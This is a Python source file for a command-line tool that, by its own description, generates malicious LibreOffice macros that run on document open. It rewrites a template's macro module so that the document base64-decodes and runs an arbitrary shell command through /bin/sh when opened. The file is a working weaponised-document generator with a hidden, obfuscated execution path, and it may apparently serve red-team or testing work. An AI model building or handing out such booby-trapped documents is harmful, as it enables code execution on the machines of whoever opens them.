import os
import zipfile
import tempfile
import re
import fileinput
import base64
import string
import random
import argparse

class ODSFile:

    def __init__(self,args):
        self.old_macro_name = "AutoSpell"
        self.command = args.command;
        self.zipfile = "templates/" + args.template;
        self.new_macro_name = args.name;
        self.output_file = args.output;

    def get_random_fname(self):
        length = random.randint(0,20);
        letters = string.ascii_lowercase + string.ascii_uppercase;
        return "".join(random.choice(letters) for i in range(length));

    def replace_macro_name(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            self.extract_dir = os.path.join(temp_dir,"extracted_files");
            os.makedirs(self.extract_dir)
            #print(self.extract_dir);
            #Extract zipfile to temporary directory and replace all ocurrences of the old macro with the new
            with zipfile.ZipFile(self.zipfile,'r') as zip_ref:
                with zipfile.ZipFile(self.output_file,"w",zipfile.ZIP_DEFLATED) as zin:
                    zip_ref.extractall(self.extract_dir);
                    #print("Extracting");
                    #os.system(f"ls {self.extract_dir}")
                    for root, dirs, files in os.walk(self.extract_dir):
                        for filename in files:
                            filepath = os.path.join(root,filename);
                            #Only modify the xml files
                            if filename[-4:] == ".xml": 
                                if filename == self.old_macro_name + ".xml":
                                    filepath = os.path.join(root,self.new_macro_name+".xml");
                                    os.rename(os.path.join(root,self.old_macro_name+".xml"),filepath);
                                    #print(f"Renamed {self.old_macro_name} to {self.new_macro_name}");
                                
                                try:
                                    if filepath != os.path.join(root,self.new_macro_name +".xml"):

                                        with fileinput.FileInput(filepath,inplace=True) as f:
                                            for line in f:
                                                print(line.replace(self.old_macro_name,self.new_macro_name),end='');
                                    else:
                                        #print(self.payload);
                                        with open(filepath,"w") as f:
                                            f.write(self.payload);

                                except Exception as e:
                                    print(f"Oops... Error whilst replacing macro name.\n Error: {e} at {filepath}");
                            
                            #Write the changes to a new zipfile
                            try:
                                arcname = os.path.relpath(filepath,self.extract_dir);
                                #print(f"Adding {filepath} and {arcname}")
                                zin.write(filepath,arcname);
                            except Exception as e:
                                print(f"Error {e} whilst writing to new zipfile");

   
    def create_macro(self):
        file_content = "";
        header = '<?xml version="1.0" encoding="UTF-8"?>\n'
        header += '<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n';
        header += '<script:module xmlns:script="http://openoffice.org/2000/script" script:name="AutoSpell" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****\n\n';
        body = "Sub Main\n";

        base64_cmd = base64.b64encode(self.command.encode("UTF-8")).decode("UTF-8");
        cmd = f"/bin/sh -c 'echo {base64_cmd} | base64 -d | sh'"
        body += f"Shell(&quot;{cmd}&quot;)\n";
        
        body += "End Sub\n";
        body += "</script:module>"
        
        self.payload = header+body;


if __name__ == "__main__":


    #templates = ["odb","odf","odg","odm","odp","ods","odt","oth"];

    file_choices = [f for f in os.listdir("templates")];

    #print(file_choices);
    

    parser = argparse.ArgumentParser(description = "CLI to generate malicious libreoffice macros that run on document open")

    parser.add_argument("-o","--output",help="Name of the payload, defaults to payload.odt",default = "payload.odt");
    parser.add_argument("-t","--template",help="Path to the template you want to use",required=True,choices=file_choices);
    parser.add_argument("-n","--name",help="Name of the macro you want, defaults to Evil",default="Evil");
    parser.add_argument("-c","--command",help="Command(s) to run on document open",required=True);

    args = parser.parse_args();

    odsFile = ODSFile(args);
    #odsFile.command = "whoami;echo potato";
    odsFile.create_macro();
    #odsFile.zipfile = "templates/template.odt";
    #odsFile.new_macro_name = "Potato";
    #odsFile.output_file = "evil.odt";
    odsFile.replace_macro_name();

    print(f"[+] Saved to {args.output} !");
    if args.output[-4:] != args.template[-4:]:
        print(f"[!] There's a mismatch between the output file and the template file's extension\n[!] Output file extension: {args.output[-4:]}\n[!] Template extension: {args.template[-4:]}");

    #odsFile.update_zip();








